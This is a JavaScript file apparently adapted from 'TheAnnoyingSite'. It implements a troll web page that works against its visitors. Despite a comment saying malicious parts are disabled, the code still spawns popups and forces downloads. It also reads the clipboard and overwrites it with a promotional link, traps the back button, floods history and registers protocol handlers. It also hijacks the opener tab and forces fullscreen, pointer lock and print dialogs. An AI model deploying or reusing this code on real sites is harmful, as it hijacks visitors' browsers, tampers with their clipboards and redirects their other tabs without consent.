// borrowed from https://github.com/feross/TheAnnoyingSite.com
// disabled most malicious trolls
// dont ban me please

const SCREEN_WIDTH = window.screen.availWidth;

const SCREEN_HEIGHT = window.screen.availHeight;

const WIN_WIDTH = 480;

const WIN_HEIGHT = 360;

const VELOCITY = 15;

const MARGIN = 15;

const TOP_MARGIN = 50;

const TICK_LENGTH = 50;

const HIDDEN_STYLE =
  "position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;";

const ART = [
  `\n┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊\n┈┈┈┈╭━━━━━━╮┊☆ ┊┊\n┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊\n┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊\n┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊\n☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊\n┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊\n  `,
  `\n░░▓▓░░░░░░░░▓▓░░\n░▓▒▒▓░░░░░░▓▒▒▓░\n░▓▒▒▒▓░░░░▓▒▒▒▓░\n░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░\n░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓\n▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓\n▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓\n▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓\n▓▒░░▒▒▒▒▒▒▒▒▒░░▓\n▓▒░░▒▓▒▒▓▒▒▓▒░░▓\n░▓▒▒▒▓▓▓▓▓▓▒▒▓░\n░░▓▒▒▒▒▒▒▒▒▒▒▓░░\n░░░▓▓▓▓▓▓▓▓▓▓░░░\n  `,
];

const VIDEOS = ["bidon.MP4", "dviz.MP4", "india.mp4", "turki.mp4"];

const FILE_DOWNLOADS = ["dude.jpg", "keks.png", "burger.png", "Husk.png"];

const PHRASES = [
  "The wheels on the bus go round and round, round and round, round and round. The wheels on the bus go round and round, all through the town!",
  "Dibidi ba didi dou dou, Di ba didi dou, Didi didldildidldidl houdihoudi dey dou",
  "I like fuzzy kittycats, warm eyes, and pretending household appliances have feelings",
  "I've never seen the inside of my own mouth because it scares me to death.",
  "hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw",
  "abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz",
  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak",
  "eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo",
];

const wins = [];

let interactionCount = 0;

const isChildWindow =
  (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf("child=true") !== -1;

const isParentWindow = !isChildWindow;

init();

if (isChildWindow) {
  initChildWindow();
} else {
  initParentWindow();
}

function init() {
  confirmPageUnload();
  interceptUserInput((event) => {
    interactionCount += 1;
    event.preventDefault();
    event.stopPropagation();
    if (event.which !== 0) {
      openWindow();
    }
    startVibrateInterval();
    enablePictureInPicture();
    triggerFileDownload();
    focusWindows();
    copySpamToClipboard();
    speak();
    startTheramin();
    if (event.key === "Meta" || event.key === "Control") {
      window.print();
    } else {
      requestPointerLock();
      requestFullscreen();
      requestClipboardRead();
    }
  });
}

function initChildWindow() {
  registerProtocolHandlers();
  hideCursor();
  moveWindowBounce();
  setupFollowWindow();
  startVideo();
  detectWindowClose();
  triggerFileDownload();
  speak();
  rainbowThemeColor();
  animateUrlWithEmojis();
  interceptUserInput(() => {
    if (interactionCount === 1) {
      startAlertInterval();
    }
  });
}

function initParentWindow() {
  showHelloMessage();
  blockBackButton();
  fillHistory();
  startInvisiblePictureInPictureVideo();
  interceptUserInput(() => {
    if (interactionCount === 1) {
      registerProtocolHandlers();
      attemptToTakeoverReferrerWindow();
      hideCursor();
      startVideo();
      startAlertInterval();
      removeHelloMessage();
      rainbowThemeColor();
      animateUrlWithEmojis();
      speak("That was a mistake");
    }
  });
}

function attemptToTakeoverReferrerWindow() {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    window.opener.location = `${window.location.origin}/?child=true`;
  }
}

function isParentSameOrigin() {
  try {
    return window.opener.location.origin === window.location.origin;
  } catch (err) {
    return false;
  }
}

function confirmPageUnload() {
  window.addEventListener("beforeunload", (event) => {
    speak("Please don't go!");
    event.returnValue = true;
  });
}

function registerProtocolHandlers() {
  if (typeof navigator.registerProtocolHandler !== "function") {
    return;
  }
  const protocolWhitelist = [
    "bitcoin",
    "geo",
    "im",
    "irc",
    "ircs",
    "magnet",
    "mailto",
    "mms",
    "news",
    "ircs",
    "nntp",
    "sip",
    "sms",
    "smsto",
    "ssh",
    "tel",
    "urn",
    "webcal",
    "wtai",
    "xmpp",
  ];
  const handlerUrl = window.location.href + "/url=%s";
  protocolWhitelist.forEach((proto) => {
    navigator.registerProtocolHandler(proto, handlerUrl, "The Annoying Site");
  });
}

function animateUrlWithEmojis() {
  if (window.ApplePaySession) {
    return;
  }
  const rand = Math.random();
  if (rand < 0.33) {
    animateUrlWithBabies();
  } else if (rand < 0.67) {
    animateUrlWithWave();
  } else {
    animateUrlWithMoons();
  }
  function animateUrlWithBabies() {
    const e = ["🏻", "🏼", "🏽", "🏾", "🏿"];
    setInterval(() => {
      let s = "";
      let i;
      let m;
      for (i = 0; i < 10; i++) {
        m = Math.floor(e.length * ((Math.sin(Date.now() / 100 + i) + 1) / 2));
        s += "👶" + e[m];
      }
      window.location.hash = s;
    }, 100);
  }
  function animateUrlWithWave() {
    setInterval(() => {
      let i;
      let n;
      let s = "";
      for (i = 0; i < 10; i++) {
        n = Math.floor(Math.sin(Date.now() / 200 + i / 2) * 4) + 4;
        s += String.fromCharCode(9601 + n);
      }
      window.location.hash = s;
    }, 100);
  }
  function animateUrlWithMoons() {
    const f = ["🌑", "🌘", "🌗", "🌖", "🌕", "🌔", "🌓", "🌒"];
    const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
    let m = 0;
    setInterval(() => {
      let s = "";
      let x = 0;
      if (!m) {
        while (d[x] === 4) {
          x++;
        }
        if (x >= d.length) {
          m = 1;
        } else {
          d[x]++;
        }
      } else {
        while (d[x] === 0) {
          x++;
        }
        if (x >= d.length) {
          m = 0;
        } else {
          d[x]++;
          if (d[x] === 8) {
            d[x] = 0;
          }
        }
      }
      d.forEach(function (n) {
        s += f[n];
      });
      window.location.hash = s;
    }, 100);
  }
}

function requestPointerLock() {
  const requestPointerLockApi =
    document.body.requestPointerLock ||
    document.body.webkitRequestPointerLock ||
    document.body.mozRequestPointerLock ||
    document.body.msRequestPointerLock;
  requestPointerLockApi.call(document.body);
}

function startVibrateInterval() {
  if (typeof window.navigator.vibrate !== "function") {
    return;
  }
  setInterval(() => {
    const duration = Math.floor(Math.random() * 600);
    window.navigator.vibrate(duration);
  }, 1e3);
  window.addEventListener("gamepadconnected", (event) => {
    const gamepad = event.gamepad;
    if (gamepad.vibrationActuator) {
      setInterval(() => {
        if (gamepad.connected) {
          gamepad.vibrationActuator.playEffect("dual-rumble", {
            duration: Math.floor(Math.random() * 600),
            strongMagnitude: Math.random(),
            weakMagnitude: Math.random(),
          });
        }
      }, 1e3);
    }
  });
}

function interceptUserInput(onInput) {
  document.body.addEventListener("touchstart", onInput, {
    passive: false,
  });
  document.body.addEventListener("mousedown", onInput);
  document.body.addEventListener("mouseup", onInput);
  document.body.addEventListener("click", onInput);
  document.body.addEventListener("keydown", onInput);
  document.body.addEventListener("keyup", onInput);
  document.body.addEventListener("keypress", onInput);
}

function startInvisiblePictureInPictureVideo() {
  const video = document.createElement("video");
  video.src = getRandomArrayEntry(VIDEOS);
  video.loop = true;
  video.muted = true;
  video.style = HIDDEN_STYLE;
  video.autoplay = true;
  video.play();
  document.body.appendChild(video);
}

function enablePictureInPicture() {
  const video = document.querySelector("video");
  if (document.pictureInPictureEnabled) {
    video.style = "";
    video.muted = false;
    video.requestPictureInPicture();
    video.play();
  }
}

function focusWindows() {
  wins.forEach((win) => {
    if (!win.closed) {
      win.focus();
    }
  });
}

function openWindow() {
  const { x: x, y: y } = getRandomCoords();
  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
  const win = window.open(window.location.pathname, "", opts);
  if (!win) {
    return;
  }
  wins.push(win);
}

function hideCursor() {
  document.querySelector("html").style = "cursor: none;";
}

function triggerFileDownload() {
  const fileName = getRandomArrayEntry(FILE_DOWNLOADS);
  const a = document.createElement("a");
  a.href = fileName;
  a.download = fileName;
  a.click();
}

function speak(phrase) {
  if (phrase == null) {
    phrase = getRandomArrayEntry(PHRASES);
  }
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase));
}

function startTheramin() {
  const audioContext = new AudioContext();
  const oscillatorNode = audioContext.createOscillator();
  const gainNode = audioContext.createGain();
  const pitchBase = 50;
  const pitchRange = 4e3;
  const wave = audioContext.createPeriodicWave(
    Array(10)
      .fill(0)
      .map((v, i) => Math.cos(i)),
    Array(10)
      .fill(0)
      .map((v, i) => Math.sin(i)),
  );
  oscillatorNode.setPeriodicWave(wave);
  oscillatorNode.connect(gainNode);
  gainNode.connect(audioContext.destination);
  oscillatorNode.start(0);
  const oscillator = ({ pitch: pitch, volume: volume }) => {
    oscillatorNode.frequency.value = pitchBase + pitch * pitchRange;
    gainNode.gain.value = volume * 0.5;
  };
  document.body.addEventListener("mousemove", (event) => {
    const { clientX: clientX, clientY: clientY } = event;
    const { clientWidth: clientWidth, clientHeight: clientHeight } =
      document.body;
    const pitch = (clientX - clientWidth / 2) / clientWidth;
    const volume = (clientY - clientHeight / 2) / clientHeight;
    oscillator({
      pitch: pitch,
      volume: volume,
    });
  });
}

function requestClipboardRead() {
  try {
    navigator.clipboard.readText().then(
      (data) => {
        if (!window.ApplePaySession) {
          window.alert("Successfully read data from clipboard: '" + data + "'");
        }
      },
      () => {},
    );
  } catch {}
}

function moveWindowBounce() {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1);
  setInterval(() => {
    const x = window.screenX;
    const y = window.screenY;
    const width = window.outerWidth;
    const height = window.outerHeight;
    if (x < MARGIN) {
      vx = Math.abs(vx);
    }
    if (x + width > SCREEN_WIDTH - MARGIN) {
      vx = -1 * Math.abs(vx);
    }
    if (y < TOP_MARGIN) {
      vy = Math.abs(vy);
    }
    if (y + height > SCREEN_HEIGHT - MARGIN) {
      vy = -1 * Math.abs(vy);
    }
    window.moveBy(vx, vy);
  }, TICK_LENGTH);
}

function setupFollowWindow() {
  document.addEventListener("mousemove", function (e) {
    window.moveTo(e.screenX - WIN_WIDTH / 2, e.screenY - WIN_HEIGHT / 2);
  });
}

function startVideo() {
  const video = document.createElement("video");
  video.src = getRandomArrayEntry(VIDEOS);
  video.autoplay = true;
  video.loop = true;
  video.style = "width: 100%; height: 100%;";
  document.body.appendChild(video);
}

function detectWindowClose() {
  window.addEventListener("unload", () => {
    if (!window.opener.closed) {
      window.opener.onCloseWindow(window);
    }
  });
}

function onCloseWindow(win) {
  const i = wins.indexOf(win);
  if (i >= 0) {
    wins.splice(i, 1);
  }
}

function showHelloMessage() {
  const template = document.querySelector("template");
  const clone = document.importNode(template.content, true);
  document.body.appendChild(clone);
}

function removeHelloMessage() {
  const helloMessage = document.querySelector(".hello-message");
  helloMessage.remove();
}

function rainbowThemeColor() {
  function zeroFill(width, number, pad = "0") {
    width -= number.toString().length;
    if (width > 0) {
      return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number;
    }
    return number + "";
  }
  const meta = document.querySelector("meta.theme-color");
  setInterval(() => {
    meta.setAttribute(
      "content",
      "#" + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)),
    );
  }, 50);
}

function copySpamToClipboard() {
  const randomArt = getRandomArrayEntry(ART) + "\nCheck out https://wiyba.org";
  clipboardCopy(randomArt);
}

function clipboardCopy(text) {
  const span = document.createElement("span");
  span.textContent = text;
  span.style.whiteSpace = "pre";
  const iframe = document.createElement("iframe");
  iframe.sandbox = "allow-same-origin";
  document.body.appendChild(iframe);
  let win = iframe.contentWindow;
  win.document.body.appendChild(span);
  let selection = win.getSelection();
  if (!selection) {
    win = window;
    selection = win.getSelection();
    document.body.appendChild(span);
  }
  const range = win.document.createRange();
  selection.removeAllRanges();
  range.selectNode(span);
  selection.addRange(range);
  let success = false;
  try {
    success = win.document.execCommand("copy");
  } catch (err) {
    console.log(err);
  }
  selection.removeAllRanges();
  span.remove();
  iframe.remove();
  return success;
}

function startAlertInterval() {
  setInterval(() => {
    if (Math.random() < 0.5) {
      showAlert();
    } else {
      window.print();
    }
  }, 12e4);
}

function showAlert() {
  const randomArt = getRandomArrayEntry(ART);
  const longAlertText = Array(200).join(randomArt);
  window.alert(longAlertText);
}

function requestFullscreen() {
  const requestFullscreen =
    Element.prototype.requestFullscreen ||
    Element.prototype.webkitRequestFullscreen ||
    Element.prototype.mozRequestFullScreen ||
    Element.prototype.msRequestFullscreen;
  requestFullscreen.call(document.body);
}

function blockBackButton() {
  window.addEventListener("popstate", () => {
    window.history.forward();
  });
}

function fillHistory() {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, "", window.location.pathname + "?q=" + i);
  }
  window.history.pushState({}, "", window.location.pathname);
}

function getRandomCoords() {
  const x =
    MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN));
  const y =
    TOP_MARGIN +
    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - TOP_MARGIN));
  return {
    x: x,
    y: y,
  };
}

function getRandomArrayEntry(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}
